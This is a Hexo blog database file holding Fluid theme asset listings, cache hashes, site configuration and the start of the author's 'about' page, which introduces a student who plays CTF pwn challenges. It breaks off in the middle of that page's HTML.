{"meta":{"version":1,"warehouse":"4.0.0"},"models":{"Asset":[{"_id":"themes/fluid/source/css/main.styl","path":"css/main.styl","modified":1,"renderable":1},{"_id":"themes/fluid/source/img/avatar.png","path":"img/avatar.png","modified":1,"renderable":1},{"_id":"themes/fluid/source/img/default.png","path":"img/default.png","modified":1,"renderable":1},{"_id":"themes/fluid/source/img/favicon.png","path":"img/favicon.png","modified":1,"renderable":1},{"_id":"themes/fluid/source/img/loading.gif","path":"img/loading.gif","modified":1,"renderable":1},{"_id":"themes/fluid/source/img/police_beian.png","path":"img/police_beian.png","modified":1,"renderable":1},{"_id":"themes/fluid/source/js/clipboard-use.js","path":"js/clipboard-use.js","modified":1,"renderable":1},{"_id":"themes/fluid/source/js/color-schema.js","path":"js/color-schema.js","modified":1,"renderable":1},{"_id":"themes/fluid/source/js/debouncer.js","path":"js/debouncer.js","modified":1,"renderable":1},{"_id":"themes/fluid/source/js/lazyload.js","path":"js/lazyload.js","modified":1,"renderable":1},{"_id":"themes/fluid/source/js/local-search.js","path":"js/local-search.js","modified":1,"renderable":1},{"_id":"themes/fluid/source/js/main.js","path":"js/main.js","modified":1,"renderable":1},{"_id":"themes/fluid/source/js/utils.js","path":"js/utils.js","modified":1,"renderable":1},{"_id":"themes/fluid/source/xml/local-search.xml","path":"xml/local-search.xml","modified":1,"renderable":1},{"_id":"themes/fluid/source/lib/hint/hint.min.css","path":"lib/hint/hint.min.css","modified":1,"renderable":1}],"Cache":[{"_id":"source/_data/fluid_config.yml","hash":"f5a8c613a09930c3c65db027000af06adfba7322","modified":1599018644453},{"_id":"source/_posts/qwblogin & GACTF vmpwn.md","hash":"4959c147bb696cb397485b3e7f2ba900e67dfb90","modified":1599018644453},{"_id":"source/about/index.md","hash":"5aece590ef7e392b8ba00131005b8d086310f229","modified":1599018644453},{"_id":"themes/fluid/source/css/_pages/_category/category.styl","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/_tag/tag.styl","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1599018644457},{"_id":"themes/fluid/.eslintrc","hash":"4bc2b19ce2b8c4d242f97d4ccf2d741e68ab0097","modified":1599018644453},{"_id":"themes/fluid/.editorconfig","hash":"33218fbd623feb43edf5f99f15965392cecc44a6","modified":1599018644453},{"_id":"themes/fluid/.gitattributes","hash":"a54f902957d49356376b59287b894b1a3d7a003f","modified":1599018644453},{"_id":"themes/fluid/.gitignore","hash":"bd095eee271360a38772ee1a42d4f000fb722e5f","modified":1599018644453},{"_id":"themes/fluid/LICENSE","hash":"5b919c12e4f5f5cdebb7c17ded4f10f1ebe64811","modified":1599018644453},{"_id":"themes/fluid/README.md","hash":"0ff14201b4a4799d5e3b1387da8e06ead1681970","modified":1599018644457},{"_id":"themes/fluid/README_en.md","hash":"99412f14c91c3bc188953eb5b347481a618facd3","modified":1599018644457},{"_id":"themes/fluid/_static_prefix.yml","hash":"dd94756c6967838bf656735a46047bb7b0031ca1","modified":1599018644457},{"_id":"themes/fluid/gulpfile.js","hash":"dc82b6be72c786721a2f5e2acc10a2a94995c540","modified":1599018644453},{"_id":"themes/fluid/package.json","hash":"167c67c82a91dbc59a2feb88af1bf211b61256a0","modified":1599018644457},{"_id":"themes/fluid/languages/ja.yml","hash":"91020031a847c0361a6fd7ab990c7be4bf17529b","modified":1599018644453},{"_id":"themes/fluid/languages/en.yml","hash":"a85dcc5cc21f9cab50df31e5001b8818ee62d1e2","modified":1599018644453},{"_id":"themes/fluid/languages/zh-CN.yml","hash":"21307b4137c3d9b04bb58243747e75af0abc5a71","modified":1599018644453},{"_id":"themes/fluid/layout/404.ejs","hash":"689d9f4efd2a7f5edfd9b24561a7ade69d46617c","modified":1599018644453},{"_id":"themes/fluid/layout/about.ejs","hash":"e967e102bab2b35b9083165c2b8e037db8e0a32d","modified":1599018644453},{"_id":"themes/fluid/layout/archive.ejs","hash":"094357be1c2c6b477269a3f4b725d3c5dd24ef8c","modified":1599018644453},{"_id":"themes/fluid/layout/categories.ejs","hash":"3b8589675338c7b3e1849104b7bb15ac477fce4e","modified":1599018644453},{"_id":"themes/fluid/layout/category.ejs","hash":"1cfe94f46f1492a411d431b02a8d09c99cab77d5","modified":1599018644453},{"_id":"themes/fluid/layout/index.ejs","hash":"9534043275df504d70232c07fec7e10503b85d32","modified":1599018644453},{"_id":"themes/fluid/layout/layout.ejs","hash":"7eef318f19597fb51b33078a9d9a14a103c1d3f0","modified":1599018644453},{"_id":"themes/fluid/layout/page.ejs","hash":"8cab50ead4cdb992d35710147a9a5308fb5df290","modified":1599018644453},{"_id":"themes/fluid/layout/post.ejs","hash":"59551ef5d9c0dee8c162ac39a18a96dafe5e1358","modified":1599018644453},{"_id":"themes/fluid/layout/tag.ejs","hash":"fd72ec9e6629facf63ce8122f0fa8d492669fa6a","modified":1599018644453},{"_id":"themes/fluid/layout/tags.ejs","hash":"1d06af34b6cf1d8a20d2eb565e309326ceba309f","modified":1599018644453},{"_id":"themes/fluid/.github/ISSUE_TEMPLATE/bug_report.md","hash":"867ed2bb90863934b72b7586ec7c31abf9863182","modified":1599018644453},{"_id":"themes/fluid/.github/ISSUE_TEMPLATE/bug_report_zh.md","hash":"5c5a5565bb13928bc92332d9b99b968673ea7dfb","modified":1599018644453},{"_id":"themes/fluid/.github/ISSUE_TEMPLATE/feature_request.md","hash":"d3a3204d9bb2b43a69c9cb0be59bada8cb91e412","modified":1599018644453},{"_id":"themes/fluid/.github/ISSUE_TEMPLATE/feature_request_zh.md","hash":"a413dc14e4737dbcaa8fb797d37f85121ede6551","modified":1599018644453},{"_id":"themes/fluid/.github/ISSUE_TEMPLATE/question.md","hash":"93cf5e1f1e0362adee0f63f4edcc7738cd4fc842","modified":1599018644453},{"_id":"themes/fluid/.github/ISSUE_TEMPLATE/question_zh.md","hash":"e24b470f7aa8044499a4f5e39634e5dc43899011","modified":1599018644453},{"_id":"themes/fluid/layout/links.ejs","hash":"6abd180ff4dd1d5d22e4c70328e3c7f83d174d9c","modified":1599018644453},{"_id":"themes/fluid/.github/workflows/lint.yaml","hash":"628f8d7655fdba149f5a9b0232df5c3225eda9da","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/beian.ejs","hash":"4f3acc8dc822c85d0d778552a15875f71c0cd80a","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/css.ejs","hash":"21964c2e5c68ee3806ef80465ef5de92174cdc3a","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/footer.ejs","hash":"03defcd4409dce27447aa8dfe7ce41a2d47e373b","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/head.ejs","hash":"4359f8598a21b133d392f71772c3f9adb5de96a0","modified":1599018644453},{"_id":"themes/fluid/.github/workflows/limit.yaml","hash":"f8bd2edeb4424ee7a055b31583445d5d5dff91a4","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/nav.ejs","hash":"70490c67b7313ae305d39331238232fe62f094f1","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/paginator.ejs","hash":"783eee847562ce14db8f723b4ae742fb69aaf620","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/post-meta.ejs","hash":"afa8b2d53452609a5ee7cf32ad5f00d5a80de72e","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/search.ejs","hash":"cdd7919fa01f6ef7ccc09938d662ff3d77f5d999","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/statistics.ejs","hash":"920bc618d357d48d2b96f8758f6ae8f9488fc4d8","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/scripts.ejs","hash":"0d818a43079d9a2da12d9c974426d675cc0b66ea","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/toc.ejs","hash":"3cf1d9b9032919d6b936e1f2410911df3b325670","modified":1599018644453},{"_id":"themes/fluid/scripts/events/index.js","hash":"36b137b75c76ff08523016dc8eac702f397d771b","modified":1599018644457},{"_id":"themes/fluid/scripts/helpers/page.js","hash":"d45dce23532c17367c7eb86b94afa8c9e40d16c6","modified":1599018644457},{"_id":"themes/fluid/scripts/helpers/url.js","hash":"99ab4551dc9c035abcc3bf4da5def2f63449d7ec","modified":1599018644457},{"_id":"themes/fluid/scripts/helpers/utils.js","hash":"9045f47c7a71aab39f16cffb3e3847b752c2e0f1","modified":1599018644457},{"_id":"themes/fluid/scripts/helpers/wordcount.js","hash":"e58d422eddb44c1be893f65f79f4c7feecfe6d5f","modified":1599018644457},{"_id":"themes/fluid/scripts/tags/button.js","hash":"48e1b46b4c34b79a128dda7a0592b43be47cf955","modified":1599018644457},{"_id":"themes/fluid/scripts/tags/checkbox.js","hash":"c131fb22805cec89d647e643299508487fc72576","modified":1599018644457},{"_id":"themes/fluid/scripts/tags/label.js","hash":"d50f5aeb1a95adbc88cea9cca4a07165d6725408","modified":1599018644457},{"_id":"themes/fluid/scripts/tags/group-image.js","hash":"4aeebb797026f1df25646a5d69f7fde79b1bcd26","modified":1599018644457},{"_id":"themes/fluid/scripts/filters/post-filter.js","hash":"6665f19fa30cbbe0853d8140a0832f8638538f89","modified":1599018644457},{"_id":"themes/fluid/scripts/tags/note.js","hash":"0886cfe3f8589671a1d289495e359c20a9908080","modified":1599018644457},{"_id":"themes/fluid/scripts/utils/join-path.js","hash":"629e7deb3955f750c1cfa6fc773f412e020fcef4","modified":1599018644457},{"_id":"themes/fluid/scripts/utils/object.js","hash":"61e9555f99edcb23d55361c7154e23af33153ecb","modified":1599018644457},{"_id":"themes/fluid/source/css/main.styl","hash":"d5a8a59c8d1fd17d699a951e59c4ce9ae44c419d","modified":1599018644457},{"_id":"themes/fluid/source/img/avatar.png","hash":"fe739a158cc128f70f780eb5fa96f388b81d478f","modified":1599018644457},{"_id":"themes/fluid/source/img/favicon.png","hash":"64b215db2cb3af98fe639e94537cb5209f959c78","modified":1599018644457},{"_id":"themes/fluid/source/img/loading.gif","hash":"2d2fc0f947940f98c21afafef39ecf226a2e8d55","modified":1599018644461},{"_id":"themes/fluid/source/img/default.png","hash":"7bb2b8ee07db305bcadee2985b81b942027ae940","modified":1599018644457},{"_id":"themes/fluid/source/img/police_beian.png","hash":"90efded6baa2dde599a9d6b1387973e8e64923ea","modified":1599018644461},{"_id":"themes/fluid/source/js/clipboard-use.js","hash":"f0ffe3df1deeb3cc36adfee2ab839368fb28d1c9","modified":1599018644461},{"_id":"themes/fluid/source/js/debouncer.js","hash":"045f324777bdfb99d4c17b1806169f029f897a65","modified":1599018644461},{"_id":"themes/fluid/source/js/color-schema.js","hash":"8728594f7dbbd18467aed378a4696b2805686903","modified":1599018644461},{"_id":"themes/fluid/source/js/lazyload.js","hash":"792deca48c12512d3e612f0de092ffcff3ca3e34","modified":1599018644461},{"_id":"themes/fluid/source/js/local-search.js","hash":"13d5ef2fe68c49bd6096781034dbb26c190b5176","modified":1599018644461},{"_id":"themes/fluid/source/js/main.js","hash":"a6def6368d288892088f78fd401e7170e3e81a13","modified":1599018644461},{"_id":"themes/fluid/source/js/utils.js","hash":"9b06e2e2a2bb92e27d15a700f28f880317c25cfa","modified":1599018644461},{"_id":"themes/fluid/layout/_partial/comments/changyan.ejs","hash":"13c0b62854668fd83287dff3792997baeeb3a2c7","modified":1599018644453},{"_id":"themes/fluid/source/xml/local-search.xml","hash":"8c96ba6a064705602ce28d096fd7dd9069630a55","modified":1599018644461},{"_id":"themes/fluid/layout/_partial/comments/disqus.ejs","hash":"f6b7af1cd9f5a9971a5c769075d001e2161da367","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/comments/gitalk.ejs","hash":"096fef408349db4ebbec84cf20a373dd46c8f4ff","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/comments/livere.ejs","hash":"f1e5d89cc98e2f6e067e5cd3db728127ccff0105","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/comments/utterances.ejs","hash":"f151bc3453a67213cfdcb944c23764fb3a780722","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/comments/valine.ejs","hash":"37941b3c6f66f1f22aeff734802373657dfdfb99","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/plugins/anchor.ejs","hash":"3738c2ef427b4b400225b92e638a17b7ab2125ed","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/plugins/analytics.ejs","hash":"0977e642c65e34d2ca2980a77b16d9ad2d3936fc","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/plugins/aplayer.ejs","hash":"e843cdbe64af3dee9385eb1d763539d3ac10ed72","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/plugins/daovoice.ejs","hash":"cfc684ba48608abd25afd155ee373d9936bbe84e","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/plugins/fancybox.ejs","hash":"c447e35c93c61a70c1c2dfc34948615832989660","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/plugins/local-search.ejs","hash":"03b024c7bab51b64e5187c9dbfac039d020f1e97","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/plugins/leancloud.ejs","hash":"7807e58722dcf992fba11bc879b0fac0e904dc76","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/plugins/math.ejs","hash":"76c4e0608ae362a265ac5e9c0fc49f75c1bc568e","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/plugins/mermaid.ejs","hash":"10ed1f9a611449d37736e17c4e251127b38b3772","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/plugins/tocjs.ejs","hash":"2d35295dba2bb912d6ce2ec7747af06bfdc82edb","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/plugins/mouse-click.ejs","hash":"eb19991199c201ceb103a6ef025e4dfd1e7dbfb7","modified":1599018644453},{"_id":"themes/fluid/layout/_partial/plugins/typed.ejs","hash":"38334350425008d1f64323de221457ee0948af0e","modified":1599018644453},{"_id":"themes/fluid/scripts/events/lib/hello.js","hash":"da4c281a8b2d2ed813da1236950c9dff87334adc","modified":1599018644457},{"_id":"themes/fluid/scripts/events/lib/footnote.js","hash":"3b2abc5f5e3b681874637e98e047dc4969eb1983","modified":1599018644457},{"_id":"themes/fluid/scripts/events/lib/highlight.js","hash":"4adf895fa1157aaf5a194f8b760332b6215656ef","modified":1599018644457},{"_id":"themes/fluid/scripts/events/lib/lazyload.js","hash":"ee7dfef805af96195c11223cca53983deace8bda","modified":1599018644457},{"_id":"themes/fluid/scripts/events/lib/merge-configs.js","hash":"a191fbf01f0266ac47f0198159f68f4b8ebb81be","modified":1599018644457},{"_id":"themes/fluid/source/css/_functions/base.styl","hash":"2e46f3f4e2c9fe34c1ff1c598738fc7349ae8188","modified":1599018644457},{"_id":"themes/fluid/scripts/events/lib/version.js","hash":"ea5f0baa30d6f768febde5f2fb4cf17d280a2adc","modified":1599018644457},{"_id":"themes/fluid/source/css/_mixins/base.styl","hash":"542e306ee9494e8a78e44d6d7d409605d94caeb3","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/pages.styl","hash":"b8e887bc7fb3b765a1f8ec9448eff8603a41984f","modified":1599018644457},{"_id":"themes/fluid/source/css/_variables/base.styl","hash":"1678c5bbb1aa2e17681f8e88776ecb802bc85b69","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/_about/about.styl","hash":"15d2786d00418e61022475194ad76445d68e27ea","modified":1599018644457},{"_id":"themes/fluid/source/lib/hint/hint.min.css","hash":"b38df228460ebfb4c0b6085336ee2878fe85aafe","modified":1599018644461},{"_id":"themes/fluid/source/css/_pages/_base/base.styl","hash":"aa2528e71c290dc43b69dfbdcf4d8d6c258015a4","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/_base/color-schema.styl","hash":"7231920523d634670344a452908f933b29a452be","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/_base/inline.styl","hash":"fab8441a0b8d8f9db6c8370013659c035345ae79","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/_base/keyframes.styl","hash":"94065ea50f5bef7566d184f2422f6ac20866ba22","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/_base/rewrite.styl","hash":"439fce1b41bc1134399e7f2ce6ffe5aa64568acd","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/_category/categories.styl","hash":"1ab7db37c2f7dc7ccdb994dcb41c16a4c8920397","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/_archive/archive.styl","hash":"6e6f22b664199772370b59ce1678b0c148b5849f","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/_links/links.styl","hash":"cd4ebb1426abed9fda93b797b02c6d5dd71dc2a1","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/_post/post.styl","hash":"f8f5503443f26354dacd139606e245f19aceb4a0","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/_post/tag_plugin.styl","hash":"cbb49a17fcc030029f0c2fbe1e056613109d1ecc","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/_tag/tags.styl","hash":"65bfc01c76abc927fa1a23bf2422892b0d566c3f","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/_base/_widget/banner.styl","hash":"5f8738c43539c27ad2ce7635a53b2cac522f1c13","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/_base/_widget/board.styl","hash":"32d90bcc8bf2fd5d8d78e86a567973d4b69bcfa1","modified":1599018644457},{"_id":"themes/fluid/scripts/generators/pages.js","hash":"01439b3d7abdeb5e51f810d784181c1d420be55d","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/_base/_widget/footer.styl","hash":"6b8340a41afc6b6e5f30dc9e912a0e0265446963","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/_base/_widget/copy-btn.styl","hash":"2c9e05a354d4be820646a1c99f814740f299ed37","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/_base/_widget/footnote.styl","hash":"ae9289cc89649af2042907f8a003303b987f3404","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/_base/_widget/header.styl","hash":"7c8170d0e2de47570fe8ed523f10ee1c33138a9f","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/_base/_widget/qrcode.styl","hash":"fe74d031acef4403e1510d4cce5bc7accd641780","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/_base/_widget/scroll-btn.styl","hash":"f1cd98a5b8d98535d707a99dba6a00f1f3978c81","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/_base/_widget/search.styl","hash":"10f7e91a91e681fb9fe46f9df7707b9ef78707c8","modified":1599018644457},{"_id":"themes/fluid/scripts/generators/local-search.js","hash":"fc2c50405b771b06b7f6cfc4e9de97b992691555","modified":1599018644457},{"_id":"themes/fluid/source/css/_pages/_index/index.styl","hash":"c443551deb389102e65cbb2441f60e8c20712ee8","modified":1599018644457},{"_id":"public/local-search.xml","hash":"16a001d7ad18c1f58fb4e83b254c3b9613ff30a5","modified":1599019231723},{"_id":"public/about/index.html","hash":"82e22b5553b59d794d1a97dc1d44118895c62e72","modified":1599019231723},{"_id":"public/2020/08/25/qwblogin & GACTF vmpwn/index.html","hash":"968faf0a2c84681009b8003e1e6abafd33119a5c","modified":1599019231723},{"_id":"public/archives/index.html","hash":"60114579464a90a409b6c114b36fd76cb1a4f934","modified":1599019231723},{"_id":"public/archives/2020/index.html","hash":"60114579464a90a409b6c114b36fd76cb1a4f934","modified":1599019231723},{"_id":"public/archives/2020/08/index.html","hash":"60114579464a90a409b6c114b36fd76cb1a4f934","modified":1599019231723},{"_id":"public/categories/CTF/index.html","hash":"c0ec4f3a710ed55b38603d147d9d455df0ed226e","modified":1599019231723},{"_id":"public/index.html","hash":"6cf863bae8da0fff5458111061cd398a75242b05","modified":1599019231723},{"_id":"public/tags/re/index.html","hash":"aebd310e187e43d11af5fcaaa2ca6e56792542e2","modified":1599019231723},{"_id":"public/tags/vm/index.html","hash":"d39df7363c1b9d3e0cd4dc6ad4c311a31f44feb4","modified":1599019231723},{"_id":"public/tags/pwn/index.html","hash":"7816d961de2ad5226736c7adacd4eee758230d79","modified":1599019231723},{"_id":"public/404.html","hash":"11c4e79e490b07201d4098be1315394aa24cd3e0","modified":1599019231723},{"_id":"public/tags/index.html","hash":"fc01d5c1e387fbc8773e285f19d092ca86579c75","modified":1599019231723},{"_id":"public/categories/index.html","hash":"f6efb671f20a51190bd30beebd9d875db37b203b","modified":1599019231723},{"_id":"public/links/index.html","hash":"1923f8941b3c5648362607be4553d3ea104f357d","modified":1599019231723},{"_id":"public/img/avatar.png","hash":"fe739a158cc128f70f780eb5fa96f388b81d478f","modified":1599019231723},{"_id":"public/img/default.png","hash":"7bb2b8ee07db305bcadee2985b81b942027ae940","modified":1599019231723},{"_id":"public/img/favicon.png","hash":"64b215db2cb3af98fe639e94537cb5209f959c78","modified":1599019231723},{"_id":"public/img/loading.gif","hash":"2d2fc0f947940f98c21afafef39ecf226a2e8d55","modified":1599019231723},{"_id":"public/img/police_beian.png","hash":"90efded6baa2dde599a9d6b1387973e8e64923ea","modified":1599019231723},{"_id":"public/xml/local-search.xml","hash":"8c96ba6a064705602ce28d096fd7dd9069630a55","modified":1599019231723},{"_id":"public/css/main.css","hash":"986c13d4282a28fe7b9006c7c5c7b5438e157646","modified":1599019231723},{"_id":"public/js/clipboard-use.js","hash":"f0ffe3df1deeb3cc36adfee2ab839368fb28d1c9","modified":1599019231723},{"_id":"public/js/color-schema.js","hash":"8728594f7dbbd18467aed378a4696b2805686903","modified":1599019231723},{"_id":"public/js/debouncer.js","hash":"045f324777bdfb99d4c17b1806169f029f897a65","modified":1599019231723},{"_id":"public/js/lazyload.js","hash":"792deca48c12512d3e612f0de092ffcff3ca3e34","modified":1599019231723},{"_id":"public/js/local-search.js","hash":"13d5ef2fe68c49bd6096781034dbb26c190b5176","modified":1599019231723},{"_id":"public/js/main.js","hash":"a6def6368d288892088f78fd401e7170e3e81a13","modified":1599019231723},{"_id":"public/js/utils.js","hash":"9b06e2e2a2bb92e27d15a700f28f880317c25cfa","modified":1599019231723},{"_id":"public/lib/hint/hint.min.css","hash":"b38df228460ebfb4c0b6085336ee2878fe85aafe","modified":1599019231723}],"Category":[{"name":"CTF","_id":"ckekurjvi0002bxxn2bho4ijv"}],"Data":[{"_id":"fluid_config","data":{"favicon":"/img/favicon.png","apple_touch_icon":"/img/favicon.png","title_join_string":" - ","force_https":false,"highlight":{"enable":true,"style":"Github Gist","bg_color":false,"copy_btn":true},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"tajs":null,"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"0x13","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"category","link":"/categories/","icon":"iconfont icon-category-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":false,"source":"busuanzi","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/default.png","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":false,"tag":true}},"page":{"banner_img":"/img/default.png","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/default.png","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"{} 字"},"min2read":{"enable":true,"format":"{} 分钟","words":100},"views":{"enable":false,"source":"busuanzi","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":false,"type":"disqus"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":null,"appkey":null,"placeholder":"说点什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":null},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"archive":{"banner_img":"/img/default.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":null},"category":{"banner_img":"/img/default.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":null,"post_limit":10,"order_by":"-length"},"tag":{"banner_img":"/img/default.png","banner_img_height":80,"banner_mask_alpha":0.3,"subtitle":null,"tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/default.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":null,"avatar":"/img/avatar.png","name":"Vang3lis","introduce":"","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com/Vang3lis","tip":"GitHub"}]},"page404":{"banner_img":"/img/default.png","banner_img_height":85,"banner_mask_alpha":0.3,"subtitle":"Page not found"},"links":{"banner_img":"/img/default.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":null,"items":[{"title":"M4x","link":"https://m4x.fun"},{"title":"Lancern","link":"https://lancern.github.io"},{"title":"ZPY","link":"https://github.com/peterzpy"},{"title":"felinae98","link":"https://code.felinae98.cn"},{"title":"Aloxaf","link":"https://aloxaf.com"},{"title":"FKY","link":"https://blog.fkynjyq.com"},{"title":"l1b0","link":"https://l1b0.fun/"}]}}}],"Page":[{"title":"about","date":"2020-09-01T02:52:06.000Z","layout":"about","_content":"\n> 欢迎来到我的小站呀，很高兴遇见你！🤝\n\n## 🏠 关于本站\n\n菜鸡的叽里咕噜\n\n## 👨‍💻 博主是谁\n\nVang3lis\n本科 BIT 之后会继续做点研究\nCTFer 在CTF比赛中喜欢做 pwn 题 （但是我很菜\n\n## ⛹ 兴趣爱好\n\nDota2\n\n## 📬 联系我呀\n\nE-mail: vang3lis.0x13@gmail.com\nGithub: [https://github.com/Vang3lis](https://github.com/Vang3lis)\n","source":"about/index.md","raw":"---\ntitle: about\ndate: 2020-09-01 10:52:06\nlayout: about\n---\n\n> 欢迎来到我的小站呀，很高兴遇见你！🤝\n\n## 🏠 关于本站\n\n菜鸡的叽里咕噜\n\n## 👨‍💻 博主是谁\n\nVang3lis\n本科 BIT 之后会继续做点研究\nCTFer 在CTF比赛中喜欢做 pwn 题 （但是我很菜\n\n## ⛹ 兴趣爱好\n\nDota2\n\n## 📬 联系我呀\n\nE-mail: vang3lis.0x13@gmail.com\nGithub: [https://github.com/Vang3lis](https://github.com/Vang3lis)\n","updated":"2020-09-02T03:50:44.453Z","path":"about/index.html","comments":1,"_id":"ckekurjv80000bxxng4g4cd0o","content":"<blockquote>\n<p>欢迎来到我的小站呀，很高兴遇见你！🤝</p>\n</blockquote>\n<h2 id=\"🏠-关于本站\"><a href=\"#🏠-关于本站\" class=\"headerlink\" title=\"🏠 关于本站\"></a>🏠 